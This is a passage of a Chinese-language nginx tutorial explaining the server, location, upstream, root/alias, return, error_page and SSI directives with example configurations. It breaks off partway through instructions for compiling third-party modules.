  # 允许或禁止压缩基于请求和响应的响应流,设置为any意味着将会压缩所有的请求
  gzip_proxied any;
  # 设置对数据启用压缩的最少字节数,若请求小于1000字节最好不要压缩它,因为压缩这些小数据会降低处理此请求的所有进程的速度
  # gzip_min_length 1000
  # 为指定的客户端禁用gzip功能,设置成IE6或者更低版本以使方案能够广泛兼容
  gzip_disable "msie6";
  # gzip_vary on;
  # 设置数据的压缩等级,是1-9之间的任意数值,9是最慢但是压缩比最大的,设置为6是一个比较折中的设置
  # gzip_comp_level 6;
  # gzip_buffers 16 8k;
  # gzip_http_version 1.1;
  # 将文件的压缩版本发送到客户端而不是常规文件,gzip_static指令不启用即时压缩,只是使用压缩工具预先压缩的文件。要在运行时即时压缩内容(而不仅仅是静态内容)须使用gzip指令
  # 压缩资源之前先查找是否有预先gzip处理过的资源,要求预先压缩文件,从而允许使用最高压缩比,nginx就不用再压缩这些文件了
  # 对/path/to/file的请求,NGINX尝试查找并发送文件/path/to/file.gz,文件不存在或客户端不支持gzip时NGINX将发送未压缩版本的文件
  # gzip_static on

  # cache informations about file descriptors,frequently accessed files can boost performance,but you need to test those values
  # 打开缓存的同时也指定了缓存最大数目及缓存的时间,可设置一个相对高的最大时间,这样可以在它们不活动超过20秒后清除掉
  open_file_cache max=100000 inactive=20s;
  # 在open_file_cache中指定检测正确信息的间隔时间
  open_file_cache_valid 30s;
  # 定义了open_file_cache中指令参数不活动时间期间里最小的文件数
  open_file_cache_min_uses 2;
  # 指定当搜索一个文件时是否缓存错误信息,也包括再次给配置中添加文件,也包括服务器模块,这些是在不同文件中定义的。如果服务器模块不在这些位置就得修改这行来指定正确的位置
  open_file_cache_errors on;

  # 虚拟主机配置 #
  include /etc/nginx/conf.d/*.conf;
  include /etc/nginx/sites-enabled/*;
}

</textarea>

<h4>server模块</h4><pre>
server模块是http模块中的子模块,用来配置虚拟主机即配置域名,一个http中可以配置多个server

1) 基于port：listen指令监听在不同的端口;
2) 基于hostname：server_name指令指向不同的主机名

Syntax: listen address[:port] [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]];
listen port [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]];
listen unix:path [default_server] [ssl] [http2 | spdy] [proxy_protocol] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]];
Default: listen *:80 | *:8000;
Context: server

Sets the address and port for IP,or the path for a UNIX-domain socket on which the server will accept requests. Both address and port,or only address or only port can be specified. An address may also be a hostname,for example:
listen 127.0.0.1:8000;
listen 127.0.0.1;
listen 8000;
listen *:8000;
listen localhost:8000;

IPv6 addresses (0.7.36) are specified in square brackets:
listen [::]:8000;
listen [::1];

UNIX-domain sockets (0.8.21) are specified with the "unix:" prefix:
listen unix:/var/run/nginx.sock;

If only address is given,the port 80 is used.

If the directive is not present then either *:80 is used if nginx runs with the superuser privileges,or *:8000 otherwise.

The default_server parameter,if present,will cause the server to become the default server for the specified address:port pair. If none of the directives have the default_server parameter then the first server with the address:port pair will be the default server for this pair.

The ssl parameter (0.7.14) allows specifying that all connections accepted on this port should work in SSL mode. This allows for a more compact configuration for the server that handles both HTTP and HTTPS requests.

The http2 parameter (1.9.5) configures the port to accept HTTP/2 connections. Normally,for this to work the ssl parameter should be specified as well,but nginx can also be configured to accept HTTP/2 connections without SSL.

The spdy parameter (1.3.15-1.9.4) allows accepting SPDY connections on this port. Normally,for this to work the ssl parameter should be specified as well,but nginx can also be configured to accept SPDY connections without SSL.

The proxy_protocol parameter (1.5.12) allows specifying that all connections accepted on this port should use the PROXY protocol.

The listen directive can have several additional parameters specific to socket-related system calls. These parameters can be specified in any listen directive,but only once for a given address:port pair.

setfib=number
this parameter (0.8.44) sets the associated routing table,FIB (the SO_SETFIB option) for the listening socket. This currently works only on FreeBSD.

fastopen=number
enables "TCP Fast Open" for the listening socket (1.5.8) and limits the maximum length for the queue of connections that have not yet completed the three-way handshake.
Do not enable this feature unless the server can handle receiving the same SYN packet with data more than once.

backlog=number
sets the backlog parameter in the listen() call that limits the maximum length for the queue of pending connections. By default,backlog is set to -1 on FreeBSD,DragonFly BSD,and macOS,and to 511 on other platforms.

参数backlog限制了用于存放处于挂起状态连接的队列最大长度,已连接但未进行accept处理的SOCKET队列大小,即这些连接已经完全建立了,但还没有被处理,其默认值是-1。当一个连接请求到达时,如果此时队列满了,客户端会收到连接拒绝("Connection refused")。

php-fpm的backlog大小设置跟php-fpm的处理能力有关
backlog太大了,导致php-fpm处理不过来,nginx那边等待超时,断开连接,报504 gateway timeout错。同时php-fpm处理完准备write数据给nginx时发现TCP连接断开了,报"Broken pipe"。
php-fpm的backlog太小的话,nginx之类的client请求,根本进入不了php-fpm的accept queue,报"502 Bad Gateway"错。所以这还得去根据php-fpm的QPS来决定backlog的大小。计算方式最好为QPS=backlog。

rcvbuf=size
sets the receive buffer size (the SO_RCVBUF option) for the listening socket.

sndbuf=size
sets the send buffer size (the SO_SNDBUF option) for the listening socket.

accept_filter=filter
sets the name of accept filter (the SO_ACCEPTFILTER option) for the listening socket that filters incoming connections before passing them to accept(). This works only on FreeBSD and NetBSD 5.0+. Possible values are dataready and httpready.

deferred
instructs to use a deferred accept() (the TCP_DEFER_ACCEPT socket option) on Linux.

bind
instructs to make a separate bind() call for a given address:port pair. This is useful because if there are several listen directives with the same port but different addresses,and one of the listen directives listens on all addresses for the given port (*:port),nginx will bind() only to *:port. It should be noted that the getsockname() system call will be made in this case to determine the address that accepted the connection. If the setfib,backlog,rcvbuf,sndbuf,accept_filter,deferred,ipv6only,or so_keepalive parameters are used then for a given address:port pair a separate bind() call will always be made.

ipv6only=on|off
this parameter (0.7.42) determines (via the IPV6_V6ONLY socket option) whether an IPv6 socket listening on a wildcard address [::] will accept only IPv6 connections or both IPv6 and IPv4 connections. This parameter is turned on by default. It can only be set once on start.
Prior to version 1.3.4,if this parameter was omitted then the operating system's settings were in effect for the socket.

reuseport
this parameter (1.9.1) instructs to create an individual listening socket for each worker process (using the SO_REUSEPORT socket option on Linux 3.9+ and DragonFly BSD,or SO_REUSEPORT_LB on FreeBSD 12+),allowing a kernel to distribute incoming connections between worker processes. This currently works only on Linux 3.9+,DragonFly BSD,and FreeBSD 12+ (1.15.1).
Inappropriate use of this option may have its security implications.

so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]
this parameter (1.1.11) configures the "TCP keepalive" behavior for the listening socket. If this parameter is omitted then the operating system's settings will be in effect for the socket. If it is set to the value "on",the SO_KEEPALIVE option is turned on for the socket. If it is set to the value "off",the SO_KEEPALIVE option is turned off for the socket. Some operating systems support setting of TCP keepalive parameters on a per-socket basis using the TCP_KEEPIDLE,TCP_KEEPINTVL,and TCP_KEEPCNT socket options. On such systems (currently,Linux 2.4+,NetBSD 5+,and FreeBSD 9.0-STABLE),they can be configured using the keepidle,keepintvl,and keepcnt parameters. One or two parameters may be omitted,in which case the system default setting for the corresponding socket option will be in effect. For example,
so_keepalive=30m::10
will set the idle timeout (TCP_KEEPIDLE) to 30 minutes,leave the probe interval (TCP_KEEPINTVL) at its system default,and set the probes count (TCP_KEEPCNT) to 10 probes.

Example:
listen 127.0.0.1 default_server accept_filter=dataready backlog=1024;

listen指令用于指定服务器侦听请求的IP地址和端口或Unix域套接字和路径,IPv4和IPv6地址均被接受;
如果仅仅只有端口则表示当前服务器所有ip的80端口,如果只想监听127.0.0.1的80则listen 127.0.0.1:80

监听IP地址127.0.0.1和端口8080的服务器的配置
server {
  listen 127.0.0.1:8080;
}

如果省略端口则使用标准端口,同样如果省略一个地址,服务器将侦听所有地址。如果没有包含listen指令,则标准端口为80/tcp,default端口为8000/tcp,具体取决于超级用户权限

如果有多个服务器与请求的IP地址和端口相匹配,则NGINX将根据服务器块中的server_name指令测试请求的主机头域
如果主机头字段与服务器名称不匹配,则NGINX会将请求路由到请求到达端口的默认服务器。 默认服务器是nginx.conf文件中列出的第一个服务器,除非将listen_server参数包含在listen指令中以明确指定服务器为默认值。
server {
  listen 80 default_server;
}

</pre><textarea>server {
  listen       80;
  listen       8080  default_server;
  server_name  example.net;
}

server {
  listen       80  default_server;
  listen       8080;
  server_name  example.org;
}

</textarea><pre>
Syntax: server_name name ...;
Default: server_name "";
Context: server
Sets names of a virtual server,The first name becomes the primary server name

server {
  server_name example.com www.example.com;
}

Server names can include an asterisk ("*") replacing the first or last part of a name,Such names are called wildcard names
server {
  server_name example.com *.example.com www.example.*;
}

The first two of the names mentioned above can be combined in one:
server {
  server_name .example.com;
}

It is also possible to use regular expressions in server names,preceding the name with a tilde ("~"):
server {
  server_name www.example.com ~^www\d+\.example\.com$;
}

Regular expressions can contain captures (0.7.40) that can later be used in other directives:
server {
  server_name ~^(www\.)?(.+)$;
  location / {
    root /sites/$2;
  }
}
server {
  server_name _;
  location / {
    root /sites/default;
  }
}

Named captures in regular expressions create variables (0.8.25) that can later be used in other directives:
server {
  server_name ~^(www\.)?(?＜domain＞.+)$;
  location / {
    root /sites/$domain;
  }
}
server {
  server_name _;
  location / {
    root /sites/default;
  }
}

If the directive's parameter is set to "$hostname" (0.9.4),the machine's hostname is inserted.

It is also possible to specify an empty server name (0.7.11):
server {
  server_name www.example.com "";
}

It allows this server to process requests without the "Host" header field — instead of the default server — for the given address:port pair. This is the default setting.

Before 0.8.48,the machine's hostname was used by default.
During searching for a virtual server by name,if the name matches more than one of the specified variants,(e.g. both a wildcard name and regular expression match),the first matching variant will be chosen,in the following order of priority:
1、the exact name
2、the longest wildcard name starting with an asterisk,e.g. "*.example.com"
3、the longest wildcard name ending with an asterisk,e.g. "mail.*"
4、the first matching regular expression (in order of appearance in the configuration file)

server_name指令配置虚拟主机的域名,后可跟一个或多个主机名域名,类似于别名,多个主机名时访问任何一个域名内容都是一样的
名称还可以使用通配符和正则表达式(~引导整个正则表达式),NGINX将Perl语法用于正则表达式,在它们之前使用波浪号〜
server_name b.ttlsa.com c.ttlsa.com d.ttlsa.com
匹配顺序：
1) 首先做精确匹配;例如：www.xxx.com
2) 左侧通配符;例如：*.xxx.com
3) 右侧通配符,例如：www.xxx.*
4) 正则表达式,例如：~^.*\.xxx\.com$
5) default_server

</pre><textarea>server {
  listen 80;                               # 侦听80端口
  server_name localhost 192.168.1.100;     # 指定ip地址或域名,多个配置之间用空格分隔,定义使用localhost访问
  root /nginx/www;                         # 表示整个server虚拟主机内的根目录,所有当前主机中web项目的根目录
  index index.php index.html index.html;   # 用户访问web网站时的全局首页
  charset utf-8;                           # 用于设置www/路径中配置的网页的默认编码格式
  access_log logs/access.log;              # 用于指定该虚拟主机服务器中的访问记录日志存放路径
  error_log logs/error.log;                # 用于指定该虚拟主机服务器中访问错误日志的存放路径
}

# 使用了标准端口80所以没有指定listen指令,将所有请求映射到本地文件系统上的目录
server {
  location / {
    root /data/www;
  }
  location /images/ {
    root /data;
  }
}

</textarea><pre>
【 基于域名的虚拟主机(name based virtual host) 】
多个虚拟主机绑定同一个端口,通过server_name区分。
理论基础就是web server通过http协议中HOST头判断具体交给哪个虚拟主机响应。
如果Host头没有匹配任意一个虚拟主机或请求中根本没有包含Host头,nginx会将请求分发到定义在此端口上的默认虚拟主机即第一个被列出的虚拟主机。

</pre><textarea>server {
  listen      80;
  server_name example.org www.example.org;
  ...
}
server {
  listen      80;
  server_name example.net www.example.net;
  ...
}
server {
  listen      80;
  server_name example.com www.example.com;
  ...
}

# listen指令中设置default_server参数可以显式地设置某个主机为默认虚拟主机,"default_server"是监听端口的属性,而不是主机名的属性
server {
  listen      80 default_server;
  server_name example.net www.example.net;
  ...
}

</textarea><pre>
处理未定义主机名的请求
如果不允许请求中缺少"Host"头,可以设置主机丢弃这些请求,设置主机名为空字符串以匹配未定义"Host"头的请求,而且返回了一个nginx特有、非http标准的返回码444用来关闭连接。
从0.8.48版本开始,这已成为主机名的默认设置,所以可以省略server_name "",而之前的版本使用机器的hostname作为主机名的默认值。
server {
  listen       80;
  server_name  "";
  return       444;
}

【 基于域名和IP混合的虚拟主机 】
server {
  listen      192.168.1.1:80;
  server_name example.org www.example.org;
}
server {
  listen      192.168.1.1:80;
  server_name example.net www.example.net;
}
server {
  listen      192.168.1.2:80;
  server_name example.com www.example.com;
}

这个配置中nginx首先测试请求的IP地址和端口是否匹配某个server配置块中的listen指令配置,接着nginx继续测试请求的Host头是否匹配这个server块中的某个server_name的值。如果主机名没有找到,nginx将把这个请求交给默认虚拟主机处理。例如,一个从192.168.1.1:80端口收到的访问www.example.com的请求将被监听192.168.1.1:80端口的默认虚拟主机处理,本例中就是第一个服务器,因为这个端口上没有定义名为www.example.com的虚拟主机。

</pre>默认服务器是监听端口的属性,所以不同的监听端口可以设置不同的默认服务器<textarea>server {
  listen      192.168.1.1:80;
  server_name example.org www.example.org;
}
server {
  listen      192.168.1.1:80 default_server;
  server_name example.net www.example.net;
}
server {
  listen      192.168.1.2:80 default_server;
  server_name example.com www.example.com;
}

</textarea><pre>
【 index指令 】
Syntax: index file ...;
Default: index index.html;
Context: http,server,location
Defines files that will be used as an index. The file name can contain variables. Files are checked in the specified order. The last element of the list can be a file with an absolute path. Example:
index index.$geo.html index.0.html /index.html;

It should be noted that using an index file causes an internal redirect,and the request can be processed in a different location. For example,with the following configuration:

location = / {
  index index.html;
}

location / {
  ...
}
a "/" request will actually be processed in the second location as "/index.html".

【 random_index指令 】
Syntax: random_index on | off;
Default: random_index off;
Context: location
Enables or disables module processing in a surrounding location

The ngx_http_random_index_module module processes requests ending with the slash character ('/') and picks a random file in a directory to serve as an index file. The module is processed before the ngx_http_index_module module.

This module is not built by default,it should be enabled with the --with-http_random_index_module configuration parameter.

location / {
  random_index on;
}

</pre>

<h4>location模块</h4><pre>
location模块是nginx server模块配置中出现最多的一个配置,主要用于配置路由访问信息,在路由配置中关联到反向代理、负载均衡等各项功能
可以包含定义如何解析请求的指令,提供静态文件或将请求传递给代理的服务器。
允许根据用户请求的URI来匹配定义的各location。匹配到时此请求将被相应的location块中的配置所处理,即用于为需要用到专用配置的uri提供特定配置

【 location指令 】
Syntax: location [ = | ~ | ~* | ^~ ] uri { ... }  # 前缀 + uri(字符串/正则表达式)
        location @name { ... }                    # @表示内部服务跳转
Default:  —
Context:  server,location

location匹配测试只使用请求URI的部分,而不使用参数部分
nginx不对url做编码,因此请求为/static/20%/aa,可以被规则^~ /static/ /aa匹配到(注意是空格)

匹配模式及顺序
location = /uri 　　 =开头表示精确匹配,只有完全匹配上才能生效,如果匹配成功则停止其他匹配,优先级最高
location ^~ /uri 　　^~开头对URL路径进行前缀匹配,并且在正则之前,表示uri以某个常规字符串开头
location ~ pattern 　~开头表示区分大小写的正则匹配
location ~* pattern  ~*开头表示不区分大小写的正则匹配
location !~ pattern 　~开头表示区分大小写的不匹配的正则
location !~* pattern  ~*开头表示不区分大小写的不匹配的正则
location /uri 　　　 不带任何修饰符,也表示前缀匹配,但在正则匹配之后
location /           通用匹配,任何未匹配到其它location的请求都会匹配到,相当于switch中的default

location匹配顺序
1、"="前缀指令匹配,如果匹配成功则停止其他匹配
2、普通字符串指令匹配,顺序是从长到短,匹配成功的location如果使用^~则停止其他匹配(正则匹配)
3、正则表达式指令匹配,按照配置文件里的顺序,成功就停止其他匹配
4、如果第三步中有匹配成功,则使用该结果,否则使用第二步结果

注意点
1、匹配的顺序是先匹配普通字符串,然后再匹配正则表达式。另外普通字符串匹配顺序是根据配置中字符长度从长到短,即使用普通字符串配置的location顺序是无关紧要的,反正最后nginx会根据配置的长短来进行匹配,但需注意正则表达式按照配置文件里的顺序测试,找到第一个比配的正则表达式将停止搜索。

2、一般情况下匹配成功了普通字符串location后还会进行正则表达式location匹配。有两种方法改变这种行为,其一就是使用"="前缀,这时执行的是严格匹配,并且匹配成功后立即停止其他匹配,同时处理这个请求;另外一种就是使用"^~"前缀,如果把这个前缀用于一个常规字符串那么告诉nginx如果路径匹配那么不测试正则表达式。

=修饰符的典型用例是/的请求,如果频繁请求/则指定=/作为location指令的参数加速处理,因为搜索匹配在第一次比较之后停止

</pre>匹配访问根目录<textarea>location / {
  root  /nginx/www;                         # 指定访问根目录时,访问虚拟主机的web目录
  index  index.php index.html index.htm;    # 在不指定访问具体资源时,默认展示的资源文件列表
}

# 设置忽略favicon.ico文件的404错误日志(关闭favicon.ico不存在时记录日志)
location = /favicon.ico {
  log_not_found off;
  access_log off;
}

</textarea><textarea># 匹配第一个location上下文的请求将从/data/images目录中提供文件,并将匹配第二个位置的请求传递给承载www.example.com域内容的代理服务器
# proxy_pass指令将请求传递给使用配置的URL访问代理服务器,然后将代理服务器的响应传回客户端。
# 示例中所有不以/images/开头的URI的请求都将被传递给代理的服务器www.example.com
server {
  location /images/ {
    root /data;
  }

  location / {
    proxy_pass http://www.example.com;
  }
}

</textarea>以/img/开头的请求,如果链接的状态为404,则会匹配到@img_err这条规则上<textarea>location /img/ {
  error_page 404 @img_err;
}

location @img_err {
  # 规则
}

</textarea>测试"^~"和"~"<textarea>浏览器输入http://localhost/helloworld/test,返回601。
如将#1注释,#2打开,浏览器输入http://localhost/helloworld/test,返回603。
注：#1和#2不能同时打开,如同时打开,启动nginx会报nginx: [emerg] duplicate location "/helloworld"...,因为这两个都是普通字符串。

location ^~ /helloworld {      #1,自定义状态码为601
  return 601;
}

#location /helloworld {        #2
#  return 602;
#}

location ~ /helloworld {
  return 603;
}

</textarea>

<h4>upstream模块</h4><pre>
upstream模块主要负责负载均衡、内容分发的配置,通过默认的轮询调度方式来分发请求到后端服务器

设备的状态:
1、down         表示该主机暂停服务,表示当前的server暂时不参与负载
2、weight       权重,默认1。weight越大,负载的权重就越大。
3、max_fails    允许请求失败的次数默认为1,当超过最大次数时返回proxy_next_upstream模块定义的错误,暂停服务
4、fail_timeout 设置max_fails次失败后暂停的时间,暂停指定的时间之后重新受理请求
5、backup       备用服务器,其它所有的非backup机器down或忙的时候请求backup机器,所以这台机器压力会最轻

</pre>设定实际的服务器列表<textarea>upstream name {
  # 指定请求调度算法,默认是weight权重轮询调度,可以指定
  ip_hash;
  server 192.168.1.100:8000;
  server 192.168.1.100:8001 down;
  server 192.168.1.100:8002 max_fails=3;
  server 192.168.1.100:8003 fail_timeout=20s;
  server 192.168.1.100:8004 max_fails=3 fail_timeout=20s;
}

</textarea>

<h4>nginx root&alias文件路径配置</h4><pre>
nginx指定文件路径有两种方式root和alias,区别在于nginx如何解释location后面的uri,这会使两者分别以不同的方式将请求映射到服务器文件上。

[root]
语法：root path
默认值：root html
配置段：http、server、location、if

[alias]
语法：alias path
配置段：location
定义路径别名

</pre><textarea>location ~ ^/weblogs/ {
  root /data/weblogs/www.ttlsa.com;
  autoindex on;
  auth_basic            "Restricted";
  auth_basic_user_file  passwd/weblogs;
}
如果请求的URI是/weblogs/httplogs/www.ttlsa.com-access.log时,web服务器将返回服务器上/data/weblogs/www.ttlsa.com/weblogs/httplogs/www.ttlsa.com-access.log文件。
root会根据完整的URI请求来映射,也就是/path/uri,因此前面的请求映射为path/weblogs/httplogs/www.ttlsa.com-access.log。

location ^~ /binapp/ {
  limit_conn limit 4;
  limit_rate 200k;
  internal;
  alias /data/statics/bin/apps/;
}
alias会把location后面配置的路径丢掉,把当前匹配到的目录指向到指定的目录
如果请求的URI是/binapp/a.ttlsa.com/favicon.jgp时,web服务器将会返回服务器上本地的/data/statics/bin/apps/a.ttlsa.com/favicon.jgp的文件。

</textarea><pre>
1. 使用alias时,目录名后面一定要加"/"。
2. alias可以指定任何名称。
3. alias在使用正则匹配时必须捕捉要匹配的内容并在指定的内容处使用。

root指令设置web资源的路径映射,用于指明请求的URL所对应的文档的目录路径
root指令指定站点根目录,即网站文件存放的地方;站点目录和域名尽量一样,养成一个好习惯
root指令指定要在其中搜索要提供的静态文件的文件系统路径,与该位置相关联的请求URI将附加到路径以获取要提供的静态文件的全名
root /data/site/b.ttlsa.com
在上面的示例中,要响应/images/logo.png的请求,NGINX提供服务器本地实际对应文件是：/data/images/logo.png。

</pre>

<h4>返回特定状态码</h4><pre>
return指令
语法：return code
默认值：none
使用字段：server,location,if
停止处理并为客户端返回状态码,可以使用的状态码有：204,400,402-406,408,410,411,413,416与500-504。
非标准的444状态码将关闭连接,不发送任何响应头。
如果状态码附带文字段落,该文本将被放置在响应主体。
如果状态码后面是一个URL,该URL将成为location头补值。
没有状态码的URL将被视为一个302状态码。

一些网站URI需要立即返回具有特定错误或重定向代码的响应,例如当页面被暂时移动或永久移动时,最简单的方法是使用return指令。

location /wrong/url {
  return 404; # 返回未找到的404状态码
}

返回的第一个参数是响应代码。可选的第二个参数可以是重定向的URL(代码301,302,303和307)或在响应体中返回文本。
因为301和302不能简单的只返回状态码,还必须有重定向的URL,这就是return指令无法返回301、302的原因了
location /permanently/moved/url {
  return 301 http://www.example.com/moved/here;
}

</pre>

<h4>处理错误</h4><pre>
【 关闭服务器标记 】
搭建好nginx或apache,为了安全起见都会隐藏他们的版本号,如果开启的话所有的错误页面都会显示服务器的版本和信息,默认开启

1、将server_tokens off;声明添加到Nginx配置文件http字段

2、编辑php-fpm配置文件如fastcgi.conf或fcgi.conf,这个配置文件名也可以自定义：
fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;
改为：
fastcgi_param SERVER_SOFTWARE nginx;

【 error_page指令 】
Syntax: error_page code ... [=[response]] uri;
Default: —
Context: http,server,location,if in location
Defines the URI that will be shown for the specified errors. A uri value can contain variables.
error_page指令配置NGINX返回自定义错误页面及错误代码,替换响应中的其他错误代码,或将浏览器重定向到其他URI,根据http的状态码重定向错误页面

error_page 404             /404.html;
error_page 500 502 503 504 /50x.html;

This causes an internal redirect to the specified uri with the client request method changed to "GET" (for all methods other than "GET" and "HEAD").

Furthermore,it is possible to change the response code to another using the "=response" syntax
error_page 404 =200 /empty.gif;

If an error response is processed by a proxied server or a FastCGI/uwsgi/SCGI/gRPC server,and the server may return different response codes (e.g.,200,302,401 or 404),it is possible to respond with the code it returns:
error_page 404 = /404.php;

If there is no need to change URI and method during internal redirection it is possible to pass error processing into a named location:
location / {
  error_page 404 = @fallback;
}
location @fallback {
  proxy_pass http://backend;
}

If uri processing leads to an error,the status code of the last occurred error is returned to the client.
It is also possible to use URL redirects for error processing:
error_page 403      http://example.com/forbidden.html;
error_page 404 =301 http://example.com/notfound.html;
In this case,by default,the response code 302 is returned to the client. It can only be changed to one of the redirect status codes (301,302,303,307,and 308).

The code 307 was not treated as a redirect until versions 1.1.16 and 1.0.13.
The code 308 was not treated as a redirect until version 1.13.0.
These directives are inherited from the previous level if and only if there are no error_page directives defined on the current level.

# 定义错误提示页面
error_page 404 /404.html  # error_page指令指定要返回404页面错误代码的页面(/404.html)
error_page 500 502 503 504 /50x.html
location = /50x.html {
  root html;
}

此伪指令并不立即返回该错误(返回指令执行该操作),而仅仅是指定发生时如何处理错误。错误代码可以来自代理服务器,或者在NGINX处理期间发生(例如当NGINX找不到客户端请求的文件时,显示404对应的结果)。

以指定的响应状态码进行响应
# 当NGINX找不到页面时会将代码301替换为代码404,并将客户端重定向到http:/example.com/new/path.html。301代码通知浏览器页面已经永久移动,并且需要在返回时自动替换旧地址。当客户端仍尝试访问其旧URI的页面时,此配置非常有用。
location /old/path.html {
  error_page 404 =301 http:/example.com/new/path.html;
  error_page 404 =200 /404.html
}

以下配置是在未找到文件时将请求传递给后端的示例。 因为在error_page指令的等号之后没有指定状态代码,所以对客户机的响应具有代理服务器返回的状态代码(不一定是404)。
server {
  location /images/ {
    root /data/www;
    open_file_cache_errors off;   # Disable logging of errors related to file existence
    error_page 404 = /fetch$uri;  # Make an internal redirect if the file is not found
  }
  location /fetch/ {
    proxy_pass http://backend/;
  }
}

当没有找到文件时,error_page指令指示NGINX进行内部重定向。 error_page指令的最终参数中的$uri变量保存当前请求的URI,该URI在重定向中被传递。
例如没找到/images/some/file,它将被替换为/fetch/images/some/file,并且新的搜索位置(location)开始。最后请求最终在第二个location上下文中,并被代理到http://backend/。
如果没有找到文件,则open_file_cache_errors指令可防止写入错误消息。 因为丢失的文件可被正确地处理,但这不是必需的。

</pre>

<h4>apache和nginx支持SSI配置</h4><pre>
一个静态化的页面中需要嵌入一小块实时变化的内容,例如首页,大部分的页面内容需要缓存但用户登录后的个人信息是动态信息,不能缓存。那么如何解决这个"页面部分缓存"问题,利用SSI就可以解决,在首页的静态页面中嵌入个人信息的动态页,由于是服务器端的嵌入,所以用户浏览的时候都是一个嵌入后的页面

SSI是Server Side Include通常称为服务器端嵌入,大多数(尤其是基于Unix平台)的WEB服务器如Netscape Enterprise Server等均支持SSI命令,是一种类似于ASP的基于服务器的网页制作技术,包含有嵌入式服务器方包含命令的HTML文本,内容被传送给浏览器之前服务器可以使用"服务器端包含(SSI)"指令对SHTML文档进行完全地读取、分析及修改,将文本、图形或应用程序信息包含到网页中。例如可以使用SSI包含时间/日期戳、版权声明或供客户填写并返回的表单。对于在多个文件中重复出现的文本或图形,使用包含文件是一种简便的方法。将内容存入一个包含文件中即可,而不必将内容输入所有文件。通过一个非常简单的语句即可调用包含文件,此语句指示Web服务器将内容插入适当网页。而且使用包含文件时,对内容的所有更改只需在一个地方就能完成。
因为包含SSI指令的文件要求特殊处理,所以必须为所有SSI文件赋予SSI文件扩展名。默认扩展名是.stm、.shtm和.shtml

二. apache配置
apache默认不支持ssi的,可以在apache下做如下设置：
修改Apache配置文件httpd.conf
1. 确认加载include.so模块,将注释去掉：
LoadModule include_module libexec/apache2/mod_include.so
2. AddType部分去掉这两段注释：
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
3. Directory目录权限里面找到
Options Indexes FollowSymLinks
增加Includes修改为：
Options Indexes FollowSymLinks Includes
4. 重新启动Apache

三. nginx配置
Nginx开启SSI支持非常简单,nginx默认就自带了SSI,不需要安装任何组件模块,通过向nginx.conf中添加几行设置命令即可实现
主要是三个参数,ssi、ssi_silent_errors和ssi_types,均可以放在http、server和location的作用域下

ssi on
开启ssi支持,默认off

ssi_silent_errors on
默认off,开启后在处理SSI文件出错时不输出错误提示:"[an error occurred while processing the directive] "

ssi_types
默认text/html,如果需要shtml支持则需要设置：ssi_types text/shtml

ssi_value_length
语法：ssi_value_length length
默认值：ssi_value_length 256
配置段：http,server,location
定义允许SSI使用的参数值的长度。

在nginx下做如下设置：
http{
  ssi on;
  ssi_silent_errors on;
  ssi_types text/shtml;
}

location ~* \.shtml${
  ssi on;
  ssi_silent_errors on;
  ssi_value_lenth 1024;
  ssi_types text/shtml;
}

location ~ .*\.(shtm|shtml)?${
  ssi on;
  ssi_silent_errors on;
  ssi_value_lenth 1024;
  ssi_types text/shtml;
}

location /{
  root html;
  index index.html index.htm;
  ssi on;
  ssi_silent_errors on;
  ssi_types text/shtml;
}

＜!–#include file="文件名称"–＞
＜!–#include virtual="文件名称"–＞
file 文件名是一个相对路径,该路径相对于使用#include指令的文档所在的目录。被包含文件可以在同一级目录或其子目录中,但不能在上一级目录中。如表示当前目录下的的nav_head.htm文档则为file="nav_head.htm"。
virtual 文件名是Web站点上的虚拟目录的完整路径。如表示相对于服务器文档根目录下hoyi目录下的nav_head.htm文件;则为virtual="/hoyi/nav_head.htm"

</pre>ssi的作用有点像jsp的include标签,不同的是ssi引用的页面来自静态页面,是不经过后台的<textarea>user nginx;
worker_processes  1;

events {
  worker_connections  1024;
}

http {
  include       mime.types;
  default_type  application/octet-stream;

  sendfile      on;
  tcp_nopush    on;
  keepalive_timeout 10;
  gzip          on;

  server {
    server_name  localhost;
    charset      utf-8;
    access_log   /var/log/nginx/access.log;
    root    /var/www;

    location = / {
      rewrite ^ /home redirect;
    }

    location / {
      ssi on;
      set $inc $request_uri;
      if (!-f $request_filename) {
        rewrite ^ /index.html last;
      }
      if (!-f $document_root$inc.html) {
        return 404;
      }
    }
  }
}

＜html＞
  ＜body＞
    ＜!--# include file="$inc.html" --＞
  ＜/body＞
＜/html＞

编写文件a.html
＜html＞
  ＜head＞＜/head＞
  ＜body＞
    A.OK
    ＜!--引入b.html--＞
    ＜!--# include file="b.html" --＞
  ＜/body＞
＜/html＞

编写文件b.html
＜html＞
  ＜head＞＜/head＞
  ＜body＞B.OK＜/body＞
＜/html＞

把编写的两个html都放到nginx的html目录中,并通过浏览器访问(http://localhost/a.html),可以看到A页面中引入了B页面的内容

</textarea>

<h4>安装nginx第三方模块</h4><pre>
nginx文件非常小但性能非常的高,这方面完胜apache,nginx文件小的一个原因是nginx自带的功能相对较少,好在nginx允许第三方模块,第三方模块使得nginx越发的强大;在安装模块方面nginx显得没有apache安装模块方便,当然也没有php安装扩展方便;原生的nginx不可以动态加载模块,所以安装第三方模块的时候需要覆盖nginx文件

nginx第三方模块安装方法：
./configure --prefix=/安装目录  --add-module=/第三方模块目录

以安装pagespeed模块实例
在未安装nginx的情况下安装nginx第三方模块
# ./configure --prefix=/usr/local/nginx-1.4.1 \
--with-http_stub_status_module \
--with-http_ssl_module --with-http_realip_module \
--with-http_image_filter_module \
--add-module=../ngx_pagespeed-master --add-module=/第三方模块目录
# make
# make install
# /usr/local/nginx-1.4.1/sbin/nginx

在已安装nginx情况下安装nginx模块,相比之下仅多了一步覆盖nginx文件
# ./configure --prefix=/usr/local/nginx-1.4.1 \
 --with-http_stub_status_module \
 --with-http_ssl_module --with-http_realip_module \
